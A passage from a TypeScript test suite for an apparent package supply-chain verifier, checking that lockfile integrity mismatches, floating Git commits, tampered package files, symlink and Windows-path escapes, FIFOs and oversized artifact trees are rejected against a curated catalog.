        expect(result.stdout).toContain('pnpm lockfile must not contain overrides')
      }

      writeLocks(npmIntegrity)
      mutateLocks((lock) => {
        lock.settings = { packageExtensionsChecksum: 'sha256-fixture' }
      })
      for (const result of await runObservedCommands()) {
        expect(result.status).toBe(1)
        expect(result.stdout).toContain('pnpm lockfile must not contain packageExtensionsChecksum')
      }

      writeLocks(npmIntegrity)
      mutateLocks((lock) => {
        lock.settings = { pnpmfileChecksum: 'sha256-fixture' }
      })
      for (const result of await runObservedCommands()) {
        expect(result.status).toBe(1)
        expect(result.stdout).toContain('pnpm lockfile must not contain pnpmfileChecksum')
      }

      writeLocks('sha512-other')
      for (const result of await runObservedCommands()) {
        expect(result.status).toBe(1)
        expect(result.stdout).toContain('pnpm package integrity differs from the catalog')
      }

      for (const testCase of [
        {
          mutate: (lock: Record<string, unknown>) => {
            lock.lockfileVersion = '8.0'
          },
          message: 'pnpm lockfile version must be 9.0',
        },
        {
          mutate: (lock: Record<string, unknown>) => {
            const importers = lock.importers as { '.': { dependencies: Record<string, { specifier: string }> } }
            importers['.'].dependencies[packageName]!.specifier = '1.0.1'
          },
          message: 'profile dependency must use exact npm version 1.0.0',
        },
        {
          mutate: (lock: Record<string, unknown>) => {
            const importers = lock.importers as { '.': { dependencies: Record<string, { version: string }> } }
            importers['.'].dependencies[packageName]!.version = '1.0.1'
          },
          message: 'pnpm dependency version differs from the catalog',
        },
      ]) {
        writeLocks(npmIntegrity)
        mutateLocks(testCase.mutate)
        expect(verify().stdout).toContain(testCase.message)
      }

      writeLocks(npmIntegrity)
      rmSync(join(profileRoot, 'node_modules', packageName), { recursive: true })
      expect(verify().stdout).toContain('selected dependency is not installed in the managed profile')
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('validates the complete runtime dependency closure from both managed profile locks', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-dependency-closure-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const gitLocator = `git+https://github.com/example/git-dep.git#${fixtureCommitC}`
    const gitTarball = `https://codeload.github.com/example/git-tar-dep/tar.gz/${fixtureCommitB}`
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      runtimeDependencyClosureSha256: fixtureRuntimeDependencyClosureSha,
      targetProfiles: ['fixture-curated'],
      externalDependencies: ['git-dep', 'git-tar-dep', 'package-record-dep', 'registry-dep'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      runtimeDependencyClosureSha256: fixtureRuntimeDependencyClosureSha,
      targetProfiles: ['fixture-curated'],
      externalDependencies: ['git-dep', 'git-tar-dep', 'package-record-dep', 'registry-dep'],
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    const baseLock = {
      lockfileVersion: '9.0',
      importers: {
        '.': {
          dependencies: {
            [packageName]: {
              specifier: npmVersion,
              version: `${npmVersion}(peer-dep@1.0.0)`,
            },
          },
        },
      },
      packages: {
        [`${packageName}@${npmVersion}`]: {
          resolution: { integrity: npmIntegrity },
        },
        'registry-dep@2.0.0': {
          resolution: { integrity: 'sha512-cmVnaXN0cnk=' },
        },
        'nested-dep@3.0.0': {
          resolution: { integrity: 'sha512-bmVzdGVk' },
        },
        'package-record-dep@4.0.0': {
          resolution: { integrity: 'sha512-cGFja2FnZS1yZWNvcmQ=' },
          dependencies: {
            'leaf-dep': '5.0.0',
          },
        },
        'leaf-dep@5.0.0': {
          resolution: { integrity: 'sha512-bGVhZg==' },
        },
        'js-yaml@4.1.0': {
          resolution: { integrity: 'sha512-YWxpYXM=' },
        },
        '@scope/target@2.0.0': {
          resolution: { integrity: 'sha512-c2NvcGVk' },
        },
        'optional-target@3.0.0': {
          resolution: { integrity: 'sha512-b3B0aW9uYWw=' },
        },
        [`git-dep@${gitLocator}`]: {
          resolution: {
            type: 'git',
            repo: 'https://github.com/example/git-dep.git',
            commit: fixtureCommitC,
          },
          version: '1.0.0',
        },
        [`git-tar-dep@${gitTarball}`]: {
          resolution: {
            gitHosted: true,
            tarball: gitTarball,
          },
          version: '1.0.0',
        },
      },
      snapshots: {
        [`${packageName}@${npmVersion}(peer-dep@1.0.0)`]: {
          dependencies: {
            'registry-dep': '2.0.0(peer-dep@1.0.0)',
            'git-dep': gitLocator,
            'git-tar-dep': gitTarball,
            'package-record-dep': '4.0.0',
            'alias-js-yaml': 'js-yaml@4.1.0',
            '@alias/scoped': 'npm:@scope/target@2.0.0(peer-dep@1.0.0)',
          },
          optionalDependencies: {
            'alias-optional': 'npm:optional-target@3.0.0',
          },
        },
        'registry-dep@2.0.0(peer-dep@1.0.0)': {
          optionalDependencies: {
            'nested-dep': '3.0.0',
          },
        },
        'nested-dep@3.0.0': {},
        'leaf-dep@5.0.0': {},
        'js-yaml@4.1.0': {},
        '@scope/target@2.0.0(peer-dep@1.0.0)': {},
        'optional-target@3.0.0': {},
        [`git-dep@${gitLocator}`]: {},
        [`git-tar-dep@${gitTarball}`]: {},
      },
    }
    const writeLocks = (lock: unknown, installedLock: unknown = lock): void => {
      writeFileSync(join(root, 'pnpm-lock.yaml'), JSON.stringify(lock))
      mkdirSync(join(root, 'node_modules/.pnpm'), { recursive: true })
      writeFileSync(join(root, 'node_modules/.pnpm/lock.yaml'), JSON.stringify(installedLock))
    }
    const verify = (): CommandResult => runVerifyLockCommand([
      '--fixture',
      catalogPath,
      '--artifact-root',
      root,
      '--json',
    ])
    const mutate = (change: (lock: typeof baseLock) => void): typeof baseLock => {
      const lock = structuredClone(baseLock)
      change(lock)
      return lock
    }
    const commands = await commandsWithCatalogCandidates([
      loadCuratedCatalog(catalogPath).candidates[0] as CuratedCandidate,
    ])
    const runObservedCommands = async (): Promise<CommandResult[]> => [
      verify(),
      commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot: root }),
      await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
        profiles: { 'fixture-curated': { bundles: [packageName] } },
        profileRoot: root,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      }),
    ]

    try {
      writeLocks(baseLock)
      for (const valid of await runObservedCommands()) {
        expect(valid.status, valid.stdout).toBe(0)
      }

      for (const mismatch of [
        {
          name: 'repository',
          mutate: (lock: typeof baseLock) => {
            lock.packages[`git-dep@${gitLocator}`].resolution.repo = 'https://github.com/example/other.git'
          },
        },
        {
          name: 'commit',
          mutate: (lock: typeof baseLock) => {
            lock.packages[`git-dep@${gitLocator}`].resolution.commit = fixtureCommitB
          },
        },
        {
          name: 'package subdirectory',
          mutate: (lock: typeof baseLock) => {
            Reflect.set(lock.packages[`git-dep@${gitLocator}`].resolution, 'path', 'packages/git-dep')
          },
        },
      ]) {
        const lock = mutate(mismatch.mutate)
        writeLocks(lock)
        for (const result of await runObservedCommands()) {
          expect(result.stdout, mismatch.name).toContain(
            'runtime Git dependency differs from its resolution repository, commit, or path',
          )
        }
      }
      writeLocks(baseLock)

      const attackerControlledLocks = mutate((lock) => {
        lock.packages['registry-dep@2.0.0'].resolution.integrity = 'sha512-YXR0YWNrZXI='
      })
      writeLocks(attackerControlledLocks)
      for (const attackerControlled of await runObservedCommands()) {
        expect(attackerControlled.status).toBe(1)
        expect(attackerControlled.stdout).toContain(
          'runtime dependency closure SHA-256 differs from the catalog',
        )
      }

      const cases = [
        {
          name: 'registry dependency without integrity',
          lock: mutate((lock) => {
            delete (lock.packages['registry-dep@2.0.0'].resolution as { integrity?: string }).integrity
          }),
          message: 'registry-dep@2.0.0 registry resolution must declare exact integrity',
        },
        {
          name: 'floating registry dependency',
          lock: mutate((lock) => {
            lock.snapshots[`${packageName}@${npmVersion}(peer-dep@1.0.0)`].dependencies['registry-dep'] = 'latest'
            Reflect.set(lock.packages, 'registry-dep@latest', {
              resolution: { integrity: 'sha512-cmVnaXN0cnk=' },
            })
          }),
          message: 'registry-dep runtime dependency must use an exact registry version',
        },
        {
          name: 'numeric prerelease with a leading zero',
          lock: mutate((lock) => {
            lock.snapshots[`${packageName}@${npmVersion}(peer-dep@1.0.0)`]
              .dependencies['registry-dep'] = '2.0.0-01'
            Reflect.set(lock.packages, 'registry-dep@2.0.0-01', {
              resolution: { integrity: 'sha512-cmVnaXN0cnk=' },
            })
          }),
          message: 'registry-dep runtime dependency must use an exact registry version',
        },
        {
          name: 'missing nested dependency resolution',
          lock: mutate((lock) => {
            delete (lock.packages as Record<string, unknown>)['nested-dep@3.0.0']
          }),
          message: 'nested-dep@3.0.0 runtime dependency is unresolved',
        },
        {
          name: 'floating Git commit',
          lock: mutate((lock) => {
            lock.packages[`git-dep@${gitLocator}`].resolution.commit = 'main'
          }),
          message: 'git-dep runtime Git resolution must declare an immutable commit',
        },
        {
          name: 'floating Git locator',
          lock: mutate((lock) => {
            lock.snapshots[`${packageName}@${npmVersion}(peer-dep@1.0.0)`]
              .dependencies['git-dep'] = 'git+https://github.com/example/git-dep.git#main'
            Reflect.set(lock.packages, 'git-dep@git+https://github.com/example/git-dep.git#main', {
              resolution: {
                type: 'git',
                repo: 'https://github.com/example/git-dep.git',
                commit: fixtureCommitC,
              },
              version: '1.0.0',
            })
          }),
          message: 'git-dep runtime Git dependency must use an immutable commit',
        },
        {
          name: 'floating Git tarball',
          lock: mutate((lock) => {
            lock.packages[`git-tar-dep@${gitTarball}`].resolution.tarball =
              'https://codeload.github.com/example/git-tar-dep/tar.gz/main'
          }),
          message: 'git-tar-dep runtime Git tarball must declare an immutable commit identity',
        },
        {
          name: 'mismatched Git tarball',
          lock: mutate((lock) => {
            lock.packages[`git-tar-dep@${gitTarball}`].resolution.tarball =
              `https://codeload.github.com/example/git-tar-dep/tar.gz/${fixtureCommitC}`
          }),
          message: 'git-tar-dep runtime Git tarball must declare an immutable commit identity',
        },
        {
          name: 'missing alias target',
          lock: mutate((lock) => {
            delete (lock.packages as Record<string, unknown>)['js-yaml@4.1.0']
          }),
          message: 'alias-js-yaml alias target js-yaml@4.1.0 runtime dependency is unresolved',
        },
        {
          name: 'inexact alias target',
          lock: mutate((lock) => {
            lock.snapshots[`${packageName}@${npmVersion}(peer-dep@1.0.0)`]
              .dependencies['alias-js-yaml'] = 'npm:js-yaml@latest'
            Reflect.set(lock.packages, 'js-yaml@latest', {
              resolution: { integrity: 'sha512-YWxpYXM=' },
            })
          }),
          message: 'alias-js-yaml runtime dependency must use an exact registry version',
        },
        {
          name: 'alias target without integrity',
          lock: mutate((lock) => {
            delete (lock.packages['js-yaml@4.1.0'].resolution as { integrity?: string }).integrity
          }),
          message: 'alias-js-yaml@4.1.0 registry resolution must declare exact integrity',
        },
        {
          name: 'alias declaration retargeted with the same integrity',
          lock: mutate((lock) => {
            lock.snapshots[`${packageName}@${npmVersion}(peer-dep@1.0.0)`]
              .dependencies['alias-js-yaml'] = 'other-yaml@4.1.0'
            Reflect.set(lock.packages, 'other-yaml@4.1.0', {
              resolution: { integrity: 'sha512-YWxpYXM=' },
            })
            Reflect.set(lock.snapshots, 'other-yaml@4.1.0', {})
          }),
          message: 'runtime dependency closure SHA-256 differs from the catalog',
        },
        {
          name: 'alias declaration renamed with the same target',
          lock: mutate((lock) => {
            const dependencies = lock.snapshots[`${packageName}@${npmVersion}(peer-dep@1.0.0)`].dependencies
            delete (dependencies as Record<string, unknown>)['alias-js-yaml']
            Reflect.set(dependencies, 'renamed-js-yaml', 'js-yaml@4.1.0')
          }),
          message: 'runtime dependency closure SHA-256 differs from the catalog',
        },
        {
          name: 'root and installed alias integrity mismatch',
          lock: baseLock,
          installedLock: mutate((lock) => {
            lock.packages['js-yaml@4.1.0'].resolution.integrity = 'sha512-bWlzbWF0Y2g='
          }),
          message: 'root and installed pnpm runtime dependency closures differ',
        },
        {
          name: 'dependency cycle',
          lock: mutate((lock) => {
            lock.snapshots['nested-dep@3.0.0'] = {
              dependencies: { 'registry-dep': '2.0.0(peer-dep@1.0.0)' },
            }
          }),
          accepted: true,
        },
        {
          name: 'root and installed closure mismatch',
          lock: mutate((lock) => {
            lock.packages['registry-dep@2.0.0'].resolution.integrity = 'sha512-b3RoZXI='
          }),
          installedLock: baseLock,
          message: 'root and installed pnpm runtime dependency closures differ',
        },
      ]
      for (const testCase of cases) {
        writeLocks(testCase.lock, testCase.installedLock)
        const result = verify()
        if (testCase.accepted === true) {
          expect(result.status, testCase.name).toBe(0)
          continue
        }
        expect(result.status, testCase.name).toBe(1)
        expect(result.stdout, testCase.name).toContain(testCase.message as string)
      }
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('binds all observed commands to the catalog-owned installed tree digest', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-tree-integrity-'))
    const profileRoot = join(home, 'profile')
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const catalogPath = join(home, 'catalog.json')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureShaB,
    })
    const packageDir = stageCandidatePackage(profileRoot, packageName, undefined, {}, undefined, candidate)
    writeFileSync(join(packageDir, 'README.md'), 'audited package\n')
    const treeSha256 = fixtureTreeSha256(packageDir)
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256,
    }))

    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      const installedCatalog = actual.loadCuratedCatalog(catalogPath)
      return {
        ...actual,
        loadCuratedCatalog: (path?: string) =>
          path === undefined ? installedCatalog : actual.loadCuratedCatalog(path),
      }
    })
    const commands = await import('../src/index.ts')
    const runObserved = async (): Promise<CommandResult[]> => [
      commands.runVerifyLock(['--fixture', catalogPath, '--artifact-root', profileRoot, '--json']),
      commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot }),
      await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
        profiles: { 'fixture-curated': { bundles: [packageName] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      }),
    ]
    const paths = {
      main: join(packageDir, 'plugin.mjs'),
      patch: join(packageDir, 'cordis.patch.yml'),
      manifest: join(packageDir, 'package.json'),
      readme: join(packageDir, 'README.md'),
    }
    const originals = Object.fromEntries(
      Object.entries(paths).map(([name, path]) => [name, readFileSync(path)]),
    ) as Record<keyof typeof paths, Buffer>

    try {
      for (const result of await runObserved()) {
        expect(JSON.parse(result.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })
      }
      for (const testCase of [
        {
          name: 'tampered main',
          mutate: () => {
            writeFileSync(paths.main, `${originals.main.toString()}\nexport const tampered = true\n`)
          },
          restore: () => {
            writeFileSync(paths.main, originals.main)
          },
        },
        {
          name: 'tampered patch',
          mutate: () => {
            writeFileSync(paths.patch, `${originals.patch.toString()}\n# tampered\n`)
          },
          restore: () => {
            writeFileSync(paths.patch, originals.patch)
          },
        },
        {
          name: 'tampered manifest',
          mutate: () => {
            writeFileSync(paths.manifest, `${originals.manifest.toString()}\n`)
          },
          restore: () => {
            writeFileSync(paths.manifest, originals.manifest)
          },
        },
        {
          name: 'extra executable',
          mutate: () => {
            writeFileSync(join(packageDir, 'extra.mjs'), 'export const unexpected = true\n')
          },
          restore: () => {
            unlinkSync(join(packageDir, 'extra.mjs'))
          },
        },
        {
          name: 'missing included file',
          mutate: () => {
            unlinkSync(paths.readme)
          },
          restore: () => {
            writeFileSync(paths.readme, originals.readme)
          },
        },
      ]) {
        testCase.mutate()
        for (const result of await runObserved()) {
          expect(result.status, testCase.name).toBe(1)
          expect(commandIssues(result), testCase.name).toContainEqual(expect.objectContaining({
            code: 'artifact-tree-sha-mismatch',
            target: 'plugin-a',
          }))
        }
        testCase.restore()
      }
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('does not accept a package-authored sidecar without a catalog tree digest', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: undefined }))
    const artifactRoot = stageCandidateArtifact('plugin-a')
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', artifactRoot, '--json'])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'candidate-tree-sha-missing',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'manifest',
      replace: (packageDir: string, outside: string) => {
        const path = join(packageDir, 'package.json')
        writeFileSync(outside, readFileSync(path))
        unlinkSync(path)
        symlinkSync(outside, path)
      },
    },
    {
      name: 'bundle patch',
      replace: (packageDir: string, outside: string) => {
        const path = join(packageDir, 'cordis.patch.yml')
        writeFileSync(outside, readFileSync(path))
        unlinkSync(path)
        symlinkSync(outside, path)
      },
    },
    {
      name: 'main',
      replace: (packageDir: string, outside: string) => {
        const path = join(packageDir, 'plugin.mjs')
        writeFileSync(outside, readFileSync(path))
        unlinkSync(path)
        symlinkSync(outside, path)
      },
    },
  ])('rejects a $name symlink that escapes the canonical package root', ({ replace }) => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-symlink-escape-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    const outside = join(root, 'outside')
    writeFileSync(outside, 'outside\n')
    replace(packageDir, outside)
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', root, '--json'])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-path-escape',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'drive path',
      candidate: { manifestPath: 'C:\\outside\\package.json' },
      prepare: (packageDir: string) => {
        writeFileSync(join(packageDir, 'C:\\outside\\package.json'), readFileSync(join(packageDir, 'package.json')))
      },
    },
    {
      name: 'UNC path',
      candidate: { bundlePatch: '\\\\server\\share\\cordis.patch.yml' },
      prepare: (packageDir: string) => {
        const manifestPath = join(packageDir, 'package.json')
        const manifest = JSON.parse(readFileSync(manifestPath, 'utf8')) as {
          dsh: { bundle: { patch: string } }
        }
        manifest.dsh.bundle.patch = '\\\\server\\share\\cordis.patch.yml'
        writeFileSync(manifestPath, JSON.stringify(manifest))
        writeFileSync(join(packageDir, '\\\\server\\share\\cordis.patch.yml'), '- insert:\n    - id: dsh-toolkit\n      name: ./plugin.mjs\n')
      },
    },
    {
      name: 'mixed-separator drive path',
      candidate: {},
      prepare: (packageDir: string) => {
        const manifestPath = join(packageDir, 'package.json')
        const manifest = JSON.parse(readFileSync(manifestPath, 'utf8')) as { main: string }
        manifest.main = 'C:/outside\\plugin.mjs'
        writeFileSync(manifestPath, JSON.stringify(manifest))
        mkdirSync(join(packageDir, 'C:'), { recursive: true })
        writeFileSync(join(packageDir, 'C:', 'outside\\plugin.mjs'), 'export function apply() {}\n')
      },
    },
  ])('rejects a Windows $name on every host', ({ candidate, prepare }) => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-windows-path-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    prepare(packageDir)
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      ...candidate,
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', root, '--json'])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-path-invalid',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.skipIf(process.platform === 'win32')('rejects a FIFO before reading artifact contents', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-fifo-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    const mainPath = join(packageDir, 'plugin.mjs')
    unlinkSync(mainPath)
    expect(spawnSync('mkfifo', [mainPath]).status).toBe(0)
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', root, '--json'])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-not-regular',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects a contained symlink as a non-regular artifact entry', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-contained-symlink-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    const mainPath = join(packageDir, 'plugin.mjs')
    writeFileSync(join(packageDir, 'real-main.mjs'), readFileSync(mainPath))
    unlinkSync(mainPath)
    symlinkSync('real-main.mjs', mainPath)
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    try {
      const result = runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({ code: 'artifact-file-not-regular' }))
      expect(payload.issues).not.toContainEqual(expect.objectContaining({ code: 'artifact-path-escape' }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('accepts the artifact entry-count limit and rejects one additional file entry', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-entry-count-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    for (let index = 0; index < 995; index += 1) {
      writeFileSync(join(packageDir, `empty-${String(index).padStart(4, '0')}`), '')
    }
    mkdirSync(join(packageDir, 'empty-directory'))
    const treeSha256 = fixtureTreeSha256(packageDir)
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256 }))
    try {
      const exact = runVerifyLockCommand(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: fixtureArtifactResolver([root]),
      })
      expect(exact.status, exact.stdout).toBe(0)

      writeFileSync(join(packageDir, 'limit-overflow-file'), '')
      const exceeded = runVerifyLockCommand(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: fixtureArtifactResolver([root]),
      })
      expect(commandIssues(exceeded)).toContainEqual(expect.objectContaining({
        code: 'artifact-entry-count-exceeded',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('stops reading a flat artifact directory at the first entry above the limit and closes it', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-flat-entry-count-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    for (let index = 0; index < 1_100; index += 1) {
      writeFileSync(join(packageDir, `empty-${String(index).padStart(4, '0')}`), '')
    }
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    let reads = 0
    let closes = 0
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      return {
        ...actual,
        opendirSync: (path: string) => {
          const directory = actual.opendirSync(path)
          const read = directory.readSync.bind(directory)
          const close = directory.closeSync.bind(directory)
          vi.spyOn(directory, 'readSync').mockImplementation(() => {
            reads += 1
            return read()
          })
          vi.spyOn(directory, 'closeSync').mockImplementation(() => {
            closes += 1
            close()
          })
          return directory
        },
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: fixtureArtifactResolver([root]),
      })

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-entry-count-exceeded',
        target: 'plugin-a',
      }))
      expect(reads).toBe(1_001)
      expect(closes).toBe(1)
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('accepts the artifact depth limit and rejects one additional directory level', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-depth-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    let directory = packageDir
    for (let depth = 0; depth < 64; depth += 1) {
      directory = join(directory, 'd')
      mkdirSync(directory)
    }
    const treeSha256 = fixtureTreeSha256(packageDir)
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256 }))
    try {
      const exact = runVerifyLockCommand(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: fixtureArtifactResolver([root]),
      })
      expect(exact.status, exact.stdout).toBe(0)

      mkdirSync(join(directory, 'overflow'))
      const exceeded = runVerifyLockCommand(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: fixtureArtifactResolver([root]),
      })
      expect(commandIssues(exceeded)).toContainEqual(expect.objectContaining({
        code: 'artifact-depth-exceeded',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.each([
    ['missing package root', join(tmpdir(), 'dsh-curated-definitely-missing-package'), 'artifact-path-invalid'],
    ['non-directory package root', undefined, 'artifact-file-not-regular'],
  ])('rejects a %s returned by an artifact resolver', (_name, packageRootOverride, code) => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-package-root-'))
    const packageRoot = packageRootOverride ?? join(root, 'package-file')
    if (packageRootOverride === undefined) writeFileSync(packageRoot, 'not a directory')
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    try {
      const result = runVerifyLockCommand(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: {
          resolve: candidate => ({
            packageDir: packageRoot,
            repository: candidate.repository,
            commit: candidate.commit,
            sourceContentSha256: fixtureShaA,
            changedPaths: [],
          }),
        },
      })

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({ code }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects a managed package root that escapes the canonical node_modules root', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-package-root-escape-'))
    const outsideRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-package-root-outside-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
    })
    mkdirSync(root, { recursive: true })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const escapedPackageDir = join(outsideRoot, packageName)
    cpSync(packageDir, escapedPackageDir, { recursive: true })
    rmSync(packageDir, { recursive: true, force: true })
    symlinkSync(escapedPackageDir, packageDir, process.platform === 'win32' ? 'junction' : 'dir')
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureTreeSha256(escapedPackageDir),
    }))
    try {
      const result = runVerifyLockCommand([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(result.stdout).toContain(
        'selected dependency package root resolves outside the managed node_modules root',
      )
    } finally {
      rmSync(root, { recursive: true, force: true })
      rmSync(outsideRoot, { recursive: true, force: true })
    }
  })

  it('does not translate unexpected tree inspection failures into artifact validation issues', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-tree-failure-'))
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    const artifact = {
      get packageDir(): string {
        throw new Error('simulated tree inspection failure')
      },
      repository: 'https://github.com/example/plugin-a',
      commit: fixtureCommitB,
      sourceContentSha256: fixtureShaA,
      changedPaths: [],
    } as ResolvedCandidateArtifact
    try {
      const result = runVerifyLockCommand(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: { resolve: () => artifact },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('simulated tree inspection failure')
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('does not translate unexpected canonical file failures into path-policy issues', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-path-failure-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      let nativeCalls = 0
      const mockedRealpath = actual.realpathSync.bind(undefined)
      mockedRealpath.native = ((path: Parameters<typeof actual.realpathSync.native>[0]) => {
        nativeCalls += 1
        if (nativeCalls === 3) throw new Error('simulated canonical file failure')
        return actual.realpathSync.native(path)
      }) as typeof actual.realpathSync.native
